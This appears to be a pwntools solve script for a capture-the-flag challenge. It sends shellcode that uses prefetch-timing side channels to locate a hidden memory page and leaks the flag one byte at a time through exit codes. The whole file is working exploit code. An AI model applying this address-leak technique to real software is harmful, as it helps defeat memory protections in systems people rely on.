#!/usr/bin/env python3
from pwn import *
import struct

def create_shellcode(start_addr, end_addr, flag_char_index):
    """
    Creates shellcode that:
    1. Searches memory from start_addr to end_addr using prefetch timing
    2. When it finds a fast address, reads the flag_char_index byte
    3. Exits with that byte as exit code
    """
    
    shellcode = f"""
    .intel_syntax noprefix
    .global _start
    
    _start:
        mov r12, {start_addr}          
        mov r13, {end_addr}           
        mov r14, {flag_char_index}    
        mov r15, 500                   
        
    search_loop:
        cmp r12, r13
        jge not_found
        
        
        mfence
        rdtsc
        shl rdx, 32
        or rax, rdx
        mov r8, rax                   
        
        prefetcht2 [r12]              
        
        mfence
        rdtsc
        shl rdx, 32
        or rax, rdx
        sub rax, r8                    
        
        
        cmp rax, r15
        jl found_candidate
        
        
        add r12, 0x1000
        jmp search_loop
        
    found_candidate:
        
        
        mov rax, r12
        add rax, r14
        
        
        mov bl, [rax]
        
        
        mov rax, 60                    
        mov rdi, rbx                   
        syscall
        
    not_found:
        
        mov rax, 60
        mov rdi, 255
        syscall
    """
    
    return asm(shellcode, arch='amd64')

def solve_challenge():
    flag = ""
    
    # The flag is likely around 64 bytes based on the read(3, local_28, 0x40)
    for char_index in range(64):
        print(f"Extracting character {char_index}...")
        
        # Try different memory ranges - the hint suggests 0x10000 to 0xffffff0000
        # We'll search in chunks to avoid spending too much time
        search_ranges = [
            (0x100000000, 0x1000000000), # Higher memory
        ]
        
        found_char = None
        
        for start_addr, end_addr in search_ranges:
            if found_char is not None:
                break
                
            print(f"  Searching range 0x{start_addr:x} - 0x{end_addr:x}")
            
            # Try this range a few times since timing can be inconsistent
            for attempt in range(3):
                try:
                    # Connect to challenge
                    p = process('./babyarch_prefetchpeek')
                    
                    # Wait for prompt
                    p.recvuntil(b'Reading 0x1000 bytes of shellcode from stdin.\n')
                    
                    # Create and send shellcode
                    shellcode = create_shellcode(start_addr, end_addr, char_index)
                    if len(shellcode) > 0x1000:
                        print(f"Shellcode too large: {len(shellcode)} bytes")
                        p.close()
                        continue
                        
                    shellcode = shellcode.ljust(0x1000, b'\x90')  # Pad with NOPs
                    p.send(shellcode)
                    
                    # Wait for execution and get exit code
                    try:
                        p.wait(timeout=5)
                        exit_code = p.poll()
                        
                        if exit_code is not None and exit_code != 255 and exit_code != 0:
                            # Got a potential flag character
                            char = chr(exit_code)
                            print(f"    Found character: '{char}' (0x{exit_code:02x})")
                            
                            # Basic sanity check - flag chars should be printable
                            if 32 <= exit_code <= 126:
                                found_char = char
                                p.close()
                                break
                                
                    except:
                        pass
                        
                    p.close()
                    
                except Exception as e:
                    print(f"    Attempt {attempt + 1} failed: {e}")
                    try:
                        p.close()
                    except:
                        pass
                        
        if found_char is not None:
            flag += found_char
            print(f"Flag so far: '{flag}'")
            
            # Stop if we hit a null byte or the flag looks complete
            if found_char == '\x00' or (len(flag) > 10 and '}' in flag):
                break
        else:
            print(f"Could not find character {char_index}")
            # Try a null byte
            flag += '\x00'
            break
            
    print(f"\nFinal flag: {flag}")
    return flag

if __name__ == "__main__":
    solve_challenge()
